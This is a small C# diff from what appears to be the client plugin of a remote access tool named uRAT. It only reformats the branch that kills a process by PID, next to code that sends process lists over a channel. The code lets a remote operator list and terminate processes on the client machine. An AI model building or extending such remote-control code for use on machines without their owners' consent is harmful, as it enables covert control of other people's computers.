@@ -21,8 +21,12 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
                 {
                     SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.MemUsage));
                 }
-            } else if (packet is KillProcessPacket)
+            } 
+            else if (packet is KillProcessPacket)
+            {
                 ProcessesHelper.KillProcessByPid((packet as KillProcessPacket).Pid);
+            }
+            
         }
 
         public override void PacketSent(IDataPacket packet, IChannel targetChannel)
